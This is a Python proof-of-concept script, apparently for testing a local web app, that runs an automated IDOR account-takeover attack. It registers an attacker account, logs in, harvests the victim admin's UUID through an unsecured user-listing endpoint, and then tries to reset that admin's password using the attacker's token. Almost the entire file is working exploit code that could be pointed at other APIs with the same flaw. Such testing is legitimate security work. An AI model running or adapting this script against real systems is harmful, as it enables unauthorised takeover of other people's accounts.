import requests
import uuid

# =======================================================
#               Attack Configuration
# =======================================================
BASE_URL = "http://localhost:3001/api/"

# Attacker credentials (auto-registered)
RANDOM_ID = str(uuid.uuid4())[:8]
ATTACKER_USERNAME = f"script_user_{RANDOM_ID}"
ATTACKER_EMAIL = f"script_{RANDOM_ID}@attacker.com"
ATTACKER_PASSWORD = "script_safe_password_123"

# Victim target
TARGET_USERNAME = "admin_korban"
NEW_PASSWORD = "password_pwned_auto_script"
# =======================================================


def register_attacker(username, email, password):
    """Step 0: register the attacker account."""
    print(f"[*] Registering account: {username}...")
    url = BASE_URL + "auth/register"
    payload = {
        "username": username,
        "email": email,
        "password": password
    }
    
    try:
        response = requests.post(url, json=payload)
        response.raise_for_status()
        print("[+] Registration success")
        return True
    except requests.exceptions.HTTPError as e:
        if response.status_code == 409:
            print("[!] Registration skipped: user already exists, will attempt login")
            return True
        print(f"[-] Registration failed: {e}")
        return False
    except requests.exceptions.RequestException as e:
        print(f"[-] Network error during registration: {e}")
        return False


def login_attacker(username, password):
    """Step 1: login to obtain attacker token."""
    print(f"[*] Logging in as: {username}...")
    url = BASE_URL + "auth/login"
    payload = {"username": username, "password": password}
    
    try:
        response = requests.post(url, json=payload)
        response.raise_for_status()
        data = response.json()
        print("[+] Login success")
        return data.get('token')
    except requests.exceptions.RequestException as e:
        print(f"[-] Login failed: {e}")
        return None

def find_target_uuid(target_username):
    """Step 2: attempt to leak victim UUID via unsecured listing."""
    print(f"\n[*] Attempting to enumerate users for: {target_username}")
    url = BASE_URL + "users/all"
    
    try:
        response = requests.get(url)
        response.raise_for_status()
        users = response.json()
        
        for user in users:
            if user.get('username') == target_username:
                uuid_korban = user.get('id')
                print(f"[+] Victim UUID leaked: {uuid_korban[:8]}...")
                return uuid_korban
        print("[-] Victim UUID not located in user listing")
        return None
    except requests.exceptions.RequestException as e:
        print(f"[-] Enumeration blocked: {e}")
        return None

def execute_idor_attack(target_uuid, attacker_token, new_password):
    """Step 3: attempt IDOR password reset."""
    print("\n[*] Attempting password reset via IDOR...")
    url = BASE_URL + "users/reset_password"
    
    headers = {
        "Authorization": f"Bearer {attacker_token}",
        "Content-Type": "application/json"
    }
    payload = {"new_password": new_password, "target_user_id": target_uuid}
    
    try:
        response = requests.post(url, headers=headers, json=payload)
        response.raise_for_status()
        print("[+] Password changed unexpectedly")
        print("[debug]", response.json())
        return True
    except requests.exceptions.HTTPError as e:
        print(f"[-] IDOR attempt blocked (HTTP {response.status_code}).")
        try:
            print("[debug]", response.json())
        except ValueError:
            print("[debug] no JSON body returned")
        return False
    except requests.exceptions.RequestException as e:
        print(f"[-] Password reset request failed: {e}")
        return False

# =======================================================
#                      Main Flow
# =======================================================
if __name__ == "__main__":
    
    print("--- Automated IDOR Exploit Starting ---")

    # 0. Register Akun Penyerang
    if not register_attacker(ATTACKER_USERNAME, ATTACKER_EMAIL, ATTACKER_PASSWORD):
        print("\n[finish] exploit aborted during registration")
        exit()

    # 1. Login Akun Penyerang
    attacker_token = login_attacker(ATTACKER_USERNAME, ATTACKER_PASSWORD)
    if not attacker_token:
        print("\n[finish] exploit aborted due to login failure")
        exit()

    # 2. Cari UUID Korban
    target_uuid = find_target_uuid(TARGET_USERNAME)
    
    if target_uuid:
        # 3. Eksekusi Serangan IDOR
        execute_idor_attack(target_uuid, attacker_token, NEW_PASSWORD)
    else:
        print("\n[finish] exploit aborted because victim UUID could not be enumerated")
    
    print("\n--- Automated IDOR Exploit Finished ---")